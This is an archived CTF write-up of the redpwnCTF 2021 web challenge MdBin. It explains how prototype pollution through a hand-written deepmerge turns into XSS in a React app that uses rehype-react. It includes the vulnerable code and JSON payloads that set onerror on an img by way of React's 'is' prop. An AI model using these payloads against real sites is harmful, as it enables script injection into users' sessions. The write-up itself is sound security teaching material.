# MdBin

**CTF:** redpwn 2021  
**Category:** web  
**Original writeup:** <https://ethanwu.dev/blog/2021/07/14/redpwn-ctf-2021-md-bin/> — by **ethanwu.dev**. All credit goes to the original author; this is an archived copy.

---

MdBin was an XSS web challenge in redpwnCTF 2021 that examined the effects of prototype pollution on a React app rendering Markdown using plugins from the unified collective. In particular, because the dependency tree (and thus potential attack surface that players need to search for) is so large, I isolated the challenge to essentially just rehype-react (and its subdependencies) and React itself. All of the relevant code is called here:

const Renderer = ( { title , hast , theme } ) => { useTitle ( title ) useTheme ( deepmerge ( { } , defaultTheme , theme ) ) return ( < div className = ' container md-content ' > { hast2reactCompiler ( hast ) } </ div > ) }

We control title and theme , and hast is the HTML AST that got compiled from the Markdown input that we also control. Tracing the imports shows that deepmerge is a homerolled implementation, which should immediately set off alarm bells for prototype pollution. And closer examination shows that it is:

const deepmerge2 = ( a , b ) => { for ( const key in b ) { if ( typeof a [ key ] === 'object' && typeof b [ key ] === 'object' && ! ( a instanceof Array ) && ! ( b instanceof Array ) ) { deepmerge2 ( a [ key ] , b [ key ] ) } else { if ( typeof b [ key ] === 'object' && ! ( b instanceof Array ) ) { a [ key ] = { } deepmerge2 ( a [ key ] , b [ key ] ) } else { a [ key ] = b [ key ] } } } } export const deepmerge = ( a , ... rest ) => { let curr = a while ( rest . length > 0 ) { deepmerge2 ( curr , rest . shift ( ) ) } return curr }

(Fun fact: the first time I tried writing the vulnerable deepmerge, I accidentally made it invulnerable to prototype pollution; the one used in the challenge was provided by ginkoid)

There’s multiple ways forward from here, and first I’ll detail the intended solution, since I believe none of the teams used this method during the CTF.

Intended solution#

From here, the first thing I tried was simply polluting a property and seeing what would happen. React allows you to programmatically create VDOM nodes via React.createElement , which uses an object for props, so you might expect some of our polluted elements to start showing up. So let’s test:

{ "content" : "content!" , "theme" : { "__proto__" : { "alt" : "polluted" } } }

gives us a p tag with a text child "content!" , but if we look at the DOM we see

< p polluted = " polluted " > content! </ p >

Somehow the value became the key too! Tracing through the execution brings us to this bit of code in hast-to-hyperscript ( rehype-react is essentially a thin wrapper around it to make it work with the unified ecosystem):

props [ hastToReact [ info . property ] || info . property ] = value

info.property is the normalized version of our property key, which in this case is just alt . Since hastToReact doesn’t have an alt key, hastToReact['alt'] goes to the prototype and gives polluted . Squinting at this a bit, we can see that we can leverage this to now get us arbitrary attribute control!

If we can make info.property equal something that is not the original key name of the entry containing the value we can pollute with, then we can set the key via adding an entry on the prototype with the value of info.property as the key and our desired key as the value. Since info.property is the normalized version of our key, we can simply change the capitalization a bit and get the lookup to resolve differently. For example:

{ "content" : "content!" , "theme" : { "__proto__" : { "alt" : "href" , "alT" : "polluted" } } }

will give us

< p href = " polluted " > content! </ p >

Let’s walk through what happens. First, we attempt to set alt="href" , which due to the previously mentioned behavior, ends up as href="href" . Next, we attempt to set alT="polluted" ; alT gets normalized to alt , and thus info.property is 'alt' . The lookup on hastToReact['alt'] falls through to the prototype, which gives us a key of 'href' , thus finally setting props['href'] = 'polluted' .

You might already see where I’m going with this; Markdown lets us create images, and if we can set the onerror DOM property, then we can execute arbitrary JavaScript. Let’s give that a try:

{ "content" : "![](//badurl)" , "theme" : { "__proto__" : { "alt" : "onerror" , "alT" : "alert(origin)" } } }

gives

< img src = " //badurl " />

Not so fast! If we take a look at the console, we will see React bailed out on setting onerror because the property was unrecognized:

Warning: Invalid event handler property `onerror`. Did you mean `onError`?

And trying onError causes React to complain that our error handler is a string and not a function:

Uncaught Error: Expected `onError` listener to be a function, instead got a value of `string` type.

(This is because React intercepts camel-cased event handlers with its own event system.) We’re going to need a way around this, and so it’s time to jump over to React DOM, the part of React responsible for rendering out the VDOM to the real DOM. Spoiler: the answer is the is prop, which was pointed out to me by ginkoid when writing the challenge. However, not everyone is just going to know about this off the top of their head, so let’s instead take a look at how we might discover is for ourselves.

We’re looking for how attributes are set, which takes us to this interesting bit of setValueForProperty in src/client/DOMPropertyOperations.js :

if ( isCustomComponentTag || propertyInfo === null ) { if ( isAttributeNameSafe ( name ) ) { const attributeName = name ; if ( value === null ) { node . removeAttribute ( attributeName ) ; } else { node . setAttribute ( attributeName , enableTrustedTypesIntegration ? ( value : any ) : '' + ( value : any ) , ) ; } } return ; }

Essentially, if isCustomComponentTag is true and the name is safe, the attribute is passed through to the DOM untouched by React ( isAttributeNameSafe essentially just checks against a regex to make sure all the characters are legal, which onerror passes). So we need to trace back how isCustomComponentTag got set; going back up the call stack for a bit gets us to isCustomComponent :

function isCustomComponent ( tagName : string , props : Object ) { if ( tagName . indexOf ( '-' ) === - 1 ) { return typeof props . is === 'string' ; } switch ( tagName ) { case 'annotation-xml' : case 'color-profile' : case 'font-face' : case 'font-face-src' : case 'font-face-uri' : case 'font-face-format' : case 'font-face-name' : case 'missing-glyph' : return false ; default : return true ; } }

img contains no - , so to get isCustomComponent to return true, we simply need a string is prop! Let’s give it a try:

{ "content" : "![](//badurl)" , "theme" : { "__proto__" : { "is" : "is" , "alt" : "onerror" , "alT" : "alert(origin)" } } }

Note that we needed onerror , not onError , since onError (and other event handlers) are processed earlier in React.

Now this of course begs the question, what is is ? Although it’s practically impossible to search for, the React implementation gives us some clues. It turns out, the global is attribute is part of the Web Components spec, and causes React to bail on prop handling because presumably the custom component will be handling them instead. It’s a very obscure part of HTML that proves very powerful when exploiting React.

Author notes#

The inspiration for this challenge was the Markdown processing stack used on this blog (at least, at the time of writing). A quick search for “React XSS” yields articles pointing to dangerouslySetInnerHTML , javascript: URIs in href s, and for some reason eval as the main vectors for attack, however I thought that programmatic creation of VDOM nodes would be the much more interesting target. I’m sure nobody needs to be told twice about how dangerous prototype pollution is in JavaScript, but what happens when a generally considered safe framework meets prototype pollution? The thesis of this challenge was to explore that in something close to a “real-world” application… except the real world often has other plans for you.

I mentioned that the attack was on the unified collective ecosystem, however the challenge only has rehype-react in the vulnerable codepath, not even touching unified itself at all! The flag answers why: flag{d1d_y0u_kn0w_unified_cr4sh3s_1mm3di4t3ly_0n_p0llut10n?}

The main unified package, which is essentially responsible for plumbing data between various plugins in the unified ecosystem, has this check:

function newable ( value , name ) { return ( typeof value === 'function' && value . prototype && ( keys ( value . prototype ) || name in value . prototype ) ) }

and then proceeds to try to call new on any plugin that it deems to be newable. The keys function only checks if there is an enumerable property somewhere on the prototype chain, ignoring whether or not it is an own property, and so using any plugin after Object.prototype gets polluted tends to lead to a very quick crash. So essentially, this particular gadget isn’t very useful in real applications, since it’s quite rare to use a single plugin only, outside of unified (and I had to do a bit of a hack to make it work for the challenge).
